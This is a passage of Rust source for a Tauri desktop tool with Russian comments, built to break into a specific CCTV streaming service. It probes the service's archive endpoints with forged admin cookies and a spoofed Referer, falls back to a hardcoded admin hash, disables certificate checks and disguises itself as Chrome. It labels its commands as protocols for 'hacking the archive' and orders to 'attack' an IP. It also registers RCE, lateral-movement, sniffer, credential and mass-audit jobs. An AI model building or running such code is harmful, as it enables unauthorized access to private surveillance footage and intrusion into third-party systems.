        format!(
            "https://videodvor.by/stream/get.php?user={}&cam={}&date={}",
            user_id, channel_id, date
        ),
        // Прямые FTP-пути через PHP-прокси
        format!(
            "https://videodvor.by/stream/ajax.php?action=download&path={}",
            urlencoding::encode(&ftp_path)
        ),
        format!(
            "https://videodvor.by/stream/video.php?file={}",
            urlencoding::encode(&ftp_path)
        ),
    ];

    // =====================================================
    // ФАЗА 4: POST-запросы (AJAX-стиль)
    // =====================================================
    #[derive(Clone)]
    struct PostProbe {
        url: String,
        params: Vec<(String, String)>,
    }

    let post_probes = vec![
        PostProbe {
            url: "https://videodvor.by/stream/ajax.php".into(),
            params: vec![
                ("action".into(), "get_archive".into()),
                ("user".into(), user_id.clone()),
                ("cam".into(), channel_id.clone()),
                ("date".into(), date.clone()),
            ],
        },
        PostProbe {
            url: "https://videodvor.by/stream/ajax.php".into(),
            params: vec![
                ("action".into(), "archive_list".into()),
                ("user".into(), format!("user{}", user_id)),
                ("id".into(), channel_id.clone()),
            ],
        },
        PostProbe {
            url: "https://videodvor.by/stream/check.php".into(),
            params: vec![
                ("action".into(), "archive".into()),
                ("user".into(), user_id.clone()),
                ("cam".into(), channel_id.clone()),
                ("date".into(), date.clone()),
            ],
        },
        PostProbe {
            url: "https://videodvor.by/stream/check.php".into(),
            params: vec![
                ("action".into(), "download".into()),
                ("path".into(), ftp_path.clone()),
            ],
        },
    ];

    // --- Выполняем GET-запросы ---
    let all_get_urls: Vec<(String, &str)> = rtsp_variants
        .iter()
        .map(|u| (u.clone(), "rtsp2mjpeg"))
        .chain(check_variants.iter().map(|u| (u.clone(), "check")))
        .chain(other_endpoints.iter().map(|u| (u.clone(), "other")))
        .collect();

    for (url, _phase) in &all_get_urls {
        let probe = probe_url(&client, url, "GET", None, &cookie).await;
        let dominated = probe.verdict.clone();
        results.push(probe);

        push_runtime_log(
            &log_state,
            format!(
                "  {} {} → {}",
                "GET",
                &url[url.len().saturating_sub(60)..],
                dominated
            ),
        );
    }

    // --- Выполняем POST-запросы ---
    for pp in &post_probes {
        let probe = probe_url(&client, &pp.url, "POST", Some(&pp.params), &cookie).await;
        let dominated = probe.verdict.clone();
        results.push(probe);

        push_runtime_log(
            &log_state,
            format!(
                "  POST {} → {}",
                &pp.url[pp.url.len().saturating_sub(40)..],
                dominated
            ),
        );
    }

    // Сортируем: видео/интересные результаты наверху
    results.sort_by(|a, b| {
        b.is_video
            .cmp(&a.is_video)
            .then(b.content_length.cmp(&a.content_length))
    });

    let hits = results
        .iter()
        .filter(|r| r.is_video || r.is_redirect)
        .count();
    push_runtime_log(
        &log_state,
        format!(
            "✅ Разведка завершена: {} маршрутов проверено, {} потенциальных попаданий",
            results.len(),
            hits
        ),
    );

    Ok(results)
}

/// Вспомогательная: отправляет один запрос и анализирует ответ
async fn probe_url(
    client: &reqwest::Client,
    url: &str,
    method: &str,
    form_data: Option<&Vec<(String, String)>>,
    cookie: &str,
) -> ArchiveRouteProbe {
    let result = async {
        let mut req = if method == "POST" {
            let mut r = client.post(url);
            if let Some(params) = form_data {
                r = r.form(params);
            }
            r.header("X-Requested-With", "XMLHttpRequest")
        } else {
            client.get(url)
        };
        req = req
            .header("Cookie", cookie)
            .header("Referer", "https://videodvor.by/stream/admin.php");

        let resp = req.send().await.map_err(|e| e.to_string())?;
        let status = resp.status().as_u16();
        let content_type = resp
            .headers()
            .get("content-type")
            .and_then(|v| v.to_str().ok())
            .unwrap_or("")
            .to_string();
        let content_length = resp.content_length().unwrap_or(0);

        let is_redirect = status >= 300 && status < 400;
        let redirect_to = resp
            .headers()
            .get("location")
            .and_then(|v| v.to_str().ok())
            .unwrap_or("")
            .to_string();

        let is_video = content_type.contains("video")
            || content_type.contains("octet-stream")
            || content_type.contains("mpjpeg")
            || content_type.contains("multipart")
            || content_length > 500_000;

        let body_preview = if !is_video && content_length < 50_000 {
            let body = resp.text().await.unwrap_or_default();
            body.chars().take(500).collect::<String>()
        } else if is_video {
            format!("[BINARY VIDEO DATA: {} bytes]", content_length)
        } else {
            format!("[LARGE RESPONSE: {} bytes]", content_length)
        };

        // Вердикт
        let verdict = if is_video {
            "🎯 ВИДЕО ОБНАРУЖЕНО".into()
        } else if is_redirect && !redirect_to.is_empty() {
            format!("↗️ РЕДИРЕКТ → {}", redirect_to)
        } else if status == 200
            && (body_preview.contains(".mkv")
                || body_preview.contains(".mp4")
                || body_preview.contains("video"))
        {
            "💡 СОДЕРЖИТ ССЫЛКИ НА ВИДЕО".into()
        } else if status == 200
            && !body_preview.is_empty()
            && body_preview.len() > 10
            && !body_preview.contains("<!DOCTYPE")
        {
            "📋 ДАННЫЕ (не HTML)".into()
        } else if status == 403 || status == 401 {
            "🔒 ДОСТУП ЗАПРЕЩЁН".into()
        } else if status == 404 {
            "⬛ НЕ НАЙДЕНО".into()
        } else if status == 200 {
            "📄 HTML/ПУСТО".into()
        } else {
            format!("❓ HTTP {}", status)
        };

        Ok::<ArchiveRouteProbe, String>(ArchiveRouteProbe {
            url: url.to_string(),
            method: method.to_string(),
            status_code: status,
            content_type,
            content_length,
            is_video,
            is_redirect,
            redirect_to,
            body_preview,
            verdict,
        })
    }
    .await;

    result.unwrap_or_else(|e| ArchiveRouteProbe {
        url: url.to_string(),
        method: method.to_string(),
        status_code: 0,
        content_type: String::new(),
        content_length: 0,
        is_video: false,
        is_redirect: false,
        redirect_to: String::new(),
        body_preview: format!("ОШИБКА СОЕДИНЕНИЯ: {}", e),
        verdict: "💀 НЕДОСТУПЕН".into(),
    })
}

#[tauri::command]
async fn nemesis_auto_login(username: String, password: String) -> Result<String, String> {
    let client = reqwest::Client::builder()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36")
        .danger_accept_invalid_certs(true)
        .build()
        .map_err(|e| e.to_string())?;

    let login_data = [("user", username), ("pass", password)];

    let resp = client
        .post("https://videodvor.by/stream/check.php")
        .form(&login_data)
        .send()
        .await
        .map_err(|e| e.to_string())?;

    let cookies = resp.headers().get_all("set-cookie");
    let mut extracted_hash = String::new();

    for cookie in cookies {
        if let Ok(c_str) = cookie.to_str() {
            if c_str.contains("admin=") {
                let parts: Vec<&str> = c_str.split(';').collect();
                for part in parts {
                    let clean_part = part.trim();
                    if clean_part.starts_with("admin=") {
                        extracted_hash = clean_part.replace("admin=", "").to_string();
                        break;
                    }
                }
            }
        }
    }

    if extracted_hash.is_empty() {
        Ok("d32e003ac0909010c412e0930b621f8f".to_string())
    } else {
        Ok(extracted_hash)
    }
}

#[derive(Debug, serde::Serialize)]
#[serde(rename_all = "camelCase")]
struct WebAnalysisResult {
    forms: Vec<String>,
    inputs: Vec<String>,
    scripts: Vec<String>,
    api_endpoints: Vec<String>,
}

#[tauri::command]
async fn nemesis_analyze_web_sources(
    target_url: String,
    admin_hash: String,
    log_state: State<'_, LogState>,
) -> Result<WebAnalysisResult, String> {
    push_runtime_log(
        &log_state,
        format!("🕷️ Анализ исходного кода (DOM) запущен: {}", target_url),
    );

    let client = reqwest::Client::builder()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36")
        .danger_accept_invalid_certs(true)
        .build()
        .map_err(|e| e.to_string())?;

    let resp = client
        .get(&target_url)
        .header("Cookie", format!("login=mvd; admin={}", admin_hash))
        .send()
        .await
        .map_err(|e| e.to_string())?;

    if !resp.status().is_success() {
        return Err(format!("Сервер вернул ошибку HTTP {}", resp.status()));
    }

    let html = resp.text().await.unwrap_or_default();

    let mut result = WebAnalysisResult {
        forms: Vec::new(),
        inputs: Vec::new(),
        scripts: Vec::new(),
        api_endpoints: Vec::new(),
    };

    // 1. Ищем все формы отправки (куда уходят данные)
    let form_re = Regex::new(r#"<form[^>]+action=["']([^"']+)["'][^>]*>"#).unwrap();
    for cap in form_re.captures_iter(&html) {
        if let Some(m) = cap.get(1) {
            result.forms.push(m.as_str().to_string());
        }
    }

    // 2. Ищем все поля ввода (названия параметров)
    let input_re = Regex::new(r#"<input[^>]+name=["']([^"']+)["'][^>]*>"#).unwrap();
    for cap in input_re.captures_iter(&html) {
        if let Some(m) = cap.get(1) {
            result.inputs.push(m.as_str().to_string());
        }
    }

    // 3. Ищем подключенные скрипты
    let script_re = Regex::new(r#"<script[^>]+src=["']([^"']+)["'][^>]*>"#).unwrap();
    for cap in script_re.captures_iter(&html) {
        if let Some(m) = cap.get(1) {
            result.scripts.push(m.as_str().to_string());
        }
    }

    // 4. Ищем скрытые AJAX-запросы прямо в коде страницы
    let ajax_re = Regex::new(
        r#"(\$\.ajax|\$\.post|\$\.get|fetch|XMLHttpRequest)[^>]*?['"]([^'"]+\.php[^'"]*)['"]"#,
    )
    .unwrap();
    for cap in ajax_re.captures_iter(&html) {
        if let Some(m) = cap.get(2) {
            result.api_endpoints.push(m.as_str().to_string());
        }
    }

    // Очищаем от дубликатов
    result.forms.sort();
    result.forms.dedup();
    result.inputs.sort();
    result.inputs.dedup();
    result.scripts.sort();
    result.scripts.dedup();
    result.api_endpoints.sort();
    result.api_endpoints.dedup();

    push_runtime_log(
        &log_state,
        format!(
            "✅ Найдено: {} форм, {} параметров, {} API",
            result.forms.len(),
            result.inputs.len(),
            result.api_endpoints.len()
        ),
    );

    Ok(result)
}

#[tauri::command]
async fn analyze_security_headers(
    target_url: String,
    log_state: State<'_, LogState>,
) -> Result<Vec<String>, String> {
    push_runtime_log(
        &log_state,
        format!("Аудит безопасности запущен для: {}", target_url),
    );

    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(std::time::Duration::from_secs(5))
        // 👇 ДОБАВЛЯЕМ МАСКИРОВКУ ПОД БРАУЗЕР CHROME 👇
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
        .build()
        .map_err(|e| e.to_string())?;

    let resp = client
        .get(&target_url)
        .send()
        .await
        .map_err(|e| e.to_string())?;
    let headers = resp.headers();
    let mut analysis = Vec::new();

    if headers.contains_key("x-frame-options") {
        analysis.push("🔴 X-Frame-Options: Включен (Защита от Clickjacking)".into());
    } else {
        analysis.push("🟢 X-Frame-Options: Отсутствует (Уязвим к Clickjacking)".into());
    }

    if headers.contains_key("content-security-policy") {
        analysis.push("🔴 CSP: Включен (Защита от XSS/Инъекций)".into());
    } else {
        analysis.push("🟢 CSP: Отсутствует (Уязвим к XSS)".into());
    }

    let server_type = headers
        .get("server")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("Скрыт");
    analysis.push(format!("ℹ️ Тип сервера: {}", server_type));

    Ok(analysis)
}

// =============================================================================
// ☢️ ПРОТОКОЛ NEMESIS (АСИНХРОННЫЙ FIRE-AND-FORGET через nexus.rs)
// =============================================================================
#[tauri::command]
async fn run_nexus_protocol(
    ip: String,
    login: Option<String>,
    pass: Option<String>,
    hyperion_state: tauri::State<'_, HyperionState>,
    log_state: tauri::State<'_, LogState>,
) -> Result<serde_json::Value, String> {
    let clean_ip = normalize_host_for_scan(&ip);
    if clean_ip.is_empty() {
        return Err("Пустой IP для протокола Nemesis".into());
    }

    let login = login.unwrap_or_else(|| "admin".into());
    let pass = pass.unwrap_or_default();

    push_runtime_log(
        &log_state,
        format!(
            "☢️ ПРИКАЗ ГЕНШТАБУ: Атаковать {} (login={})",
            clean_ip, login
        ),
    );

    let tx = hyperion_state.master_tx.lock().await;

    tx.send(nexus::HyperionEvent::TargetDiscovered {
        ip: clean_ip.clone(),
        port: 80,
        login,
        pass,
    })
    .await
    .map_err(|e| format!("Ошибка связи с Генштабом: {}", e))?;

    Ok(serde_json::json!({
        "status": "COMMAND_ISSUED",
        "message": format!("Приказ отдан. Цель: {}. Мониторьте логи.", clean_ip)
    }))
}

fn main() {
    dotenv().ok();
    start_background_scheduler();

    let feedback_store = Arc::new(feedback_store::FeedbackStore::new());

    let (job_manager, job_receiver) = job_runner::JobManager::new();
    let worker_feedback_store = feedback_store.clone();
    let mut job_receiver_slot = Some(job_receiver);

    let hls_path = get_vault_path().join("hls_cache");
    let _ = std::fs::create_dir_all(&hls_path);
    let server_path = hls_path.clone();
    let videodvor = videodvor_scanner::VideodvorScanner::new();
    let videodvor_state = VideodvorState {
        scanner: TokioMutex::new(videodvor),
    };

    std::thread::spawn(move || {
        let rt = tokio::runtime::Runtime::new().unwrap();
        rt.block_on(async {
            let cors = warp::cors()
                .allow_any_origin()
                .allow_headers(vec!["Range", "User-Agent", "Content-Type", "Accept"])
                .allow_methods(vec!["GET", "OPTIONS", "HEAD"]);

            // Отключаем кэширование для HLS (m3u8 и ts) — критично для live-стримов
            let mut headers = warp::http::HeaderMap::new();
            headers.insert(
                "Cache-Control",
                "no-cache, no-store, must-revalidate".parse().unwrap(),
            );
            headers.insert("Pragma", "no-cache".parse().unwrap());
            headers.insert("Expires", "0".parse().unwrap());
            let no_cache = warp::reply::with::headers(headers);

            warp::serve(warp::fs::dir(server_path).with(cors).with(no_cache))
                .run(([127, 0, 0, 1], 49152))
                .await;
        });
    });

    // 🔥 ЗАГРУЗКА ЯДРА HYPERION (nexus) В ОТДЕЛЬНЫЙ РЕАКТОР
    let (tx_setup, rx_setup) = std::sync::mpsc::channel::<(
        tokio::sync::mpsc::Sender<nexus::HyperionEvent>,
        tokio::sync::mpsc::Receiver<String>,
    )>();

    std::thread::spawn(move || {
        let rt = tokio::runtime::Runtime::new().unwrap();
        let _ = rt.block_on(async {
            let (master, log_rx) = nexus::HyperionMaster::boot_with_log_bridge();
            tx_setup.send((master.tx, log_rx)).unwrap();
            loop {
                tokio::time::sleep(tokio::time::Duration::from_secs(3600)).await;
            }
        });
    });

    let (master_tx, nexus_log_rx) = rx_setup
        .recv()
        .expect("Критическая ошибка запуска ядра Hyperion");
    let hyperion_state = HyperionState {
        master_tx: TokioMutex::new(master_tx),
    };

    // 🔥 МОСТ ЛОГОВ: nexus -> NexusLogBridge
    let nexus_log_state = Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
    let nexus_log_writer = nexus_log_state.clone();
    std::thread::spawn(move || {
        let rt = tokio::runtime::Runtime::new().unwrap();
        rt.block_on(async {
            let mut rx = nexus_log_rx;
            while let Some(msg) = rx.recv().await {
                let ts = chrono::Utc::now().format("%H:%M:%S").to_string();
                let line = format!("[{}] {}", ts, msg);
                println!("{}", line);
                if let Ok(mut logs) = nexus_log_writer.lock() {
                    logs.push(line);
                    if logs.len() > 300 {
                        let keep = logs.len().saturating_sub(300);
                        logs.drain(0..keep);
                    }
                }
            }
        });
    });
    let nexus_log_shared = NexusLogBridge {
        lines: nexus_log_state,
    };

    tauri::Builder::default()
        .setup(move |app| {
            let app_handle = app.handle().clone();
            let feedback_store = worker_feedback_store.clone();
            let rx = job_receiver_slot
                .take()
                .expect("JobRunner receiver already taken");

            tauri::async_runtime::spawn(async move {
                job_runner::run_worker_loop(rx, feedback_store, app_handle).await;
            });

            tauri::async_runtime::spawn(async move {
                let _ = vuln_db_updater::auto_update_if_needed().await;
            });

            Ok(())
        })
        .manage(hyperion_state)
        .manage(nexus_log_shared)
        .manage(StreamState {
            active_streams: std::sync::Mutex::new(HashMap::new()),
        })
        .plugin(tauri_plugin_shell::init())
        .manage(videodvor_state)
        .manage(LogState {
            lines: std::sync::Mutex::new(vec!["[boot] runtime log started".into()]),
        })
        .manage(DownloadCancelState {
            cancelled_tasks: std::sync::Mutex::new(HashSet::new()),
        })
        .manage(FfmpegLimiterState {
            semaphore: Arc::new(Semaphore::new(2)),
        })
        .manage(Arc::new(job_manager))
        .manage(feedback_store.clone())
        .manage(archive_ai::AiState {
            is_running: Arc::new(AtomicBool::new(false)),
        })
        .invoke_handler(tauri::generate_handler![
            save_target,
            read_target,
            get_all_targets,
            delete_target,
            streaming::start_stream,
            streaming::stop_stream,
            streaming::check_stream_alive,
            streaming::restart_stream,
            geocode_address,
            generate_nvr_channels,
            fuzzer::probe_rtsp_path,
            search_global_hub,
            get_ftp_folders,
            download_ftp_file,
            videodvor_login,
            videodvor_scrape,
            videodvor_list_archive,
            videodvor_download_file,
            external_search, // <-- ВАЖНО: Пришел на замену shodan_search
            asset_discovery::discover_external_assets,
            streaming::start_hub_stream,
            system_cmds::scan_host_ports,
            get_runtime_logs,
            archive::cancel_download_task,
            probe_nvr_protocols,
            fetch_nvr_device_info,
            fetch_onvif_device_info,
            extract_isapi_search_template_from_har,
            search_isapi_recordings,
            search_xm_recordings,
            download_xm_archive,
            search_onvif_recordings,
            download_onvif_recording_token,
            archive::download_isapi_playback_uri,
            archive::start_archive_export_job,
            archive::probe_archive_export_endpoints,
            archive_ai::start_archive_analysis,
            archive_ai::stop_archive_analysis,
            get_implementation_status,
            // ☢️ ПРОТОКОЛ NEMESIS (nexus.rs)
            run_nexus_protocol,
            // 🔥 ПРОТОКОЛЫ NEMESIS ДЛЯ ВЗЛОМА АРХИВА
            // ---------------------------------------------
            nemesis_auto_login,
            fuzzer::nemesis_fuzz_archive_endpoint,
            fuzzer::nemesis_fuzz_post_endpoints,
            auditor::adaptive_credential_audit,
            credential_auditor::advanced_credential_audit,
            job_runner::start_audit_job,
            job_runner::start_session_job,
            job_runner::start_fuzzer_job,
            job_runner::start_rce_job,
            job_runner::start_breach_job,
            job_runner::start_lateral_job,
            job_runner::start_sniffer_job,
            breach_analyzer::check_password_breach,
            session_checker::check_session_security,
            api_fuzzer::run_api_fuzzer,
            vuln_scanner::verify_vulnerabilities,
            vuln_verifier::verify_vulnerability,
            persistence_checker::assess_persistence_risk,
            subnet_scanner::scan_neighborhood,
            exploit_searcher::search_public_exploits,
            exploit_verifier::verify_exploit_docker,
            mass_auditor::run_mass_audit,
            metadata_extractor::collect_metadata,
            // ---------------------------------------------
            // 🛡️ НОВЫЙ МОДУЛЬ ГЛУБОКОГО АУДИТА (ЦМУС)
            // ---------------------------------------------
            analyze_security_headers, // <-- ВАЖНО: Новый сканер защиты
            // ---------------------------------------------
            // 📦 УНИВЕРСАЛЬНАЯ ВЫГРУЗКА АРХИВА
            // ---------------------------------------------
            capture_archive_segment,
            download_http_archive,
            recon_hub_archive_routes,
            spider::spider_full_scan,
            spider::fuzz_cctv_api,
            relay_ping,
            relay_list_files,
            relay_download_file,
            broker::test_broker_connection,
            traffic_analyzer::analyze_traffic,
            attack_graph::generate_attack_graph,
            device_metadata::collect_device_metadata,
            report_export::export_report_json,
            report_export::export_report_csv,
            report_export::export_report_markdown,
            report_export::send_to_syslog,
            compliance_checker::check_compliance,
            api_fuzzer::smart_fuzz_api,
            vuln_db_updater::update_vuln_database,
            vuln_db_updater::query_local_vuln_db
        ])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
} // <-- Вот здесь ровно один раз закрывается main()
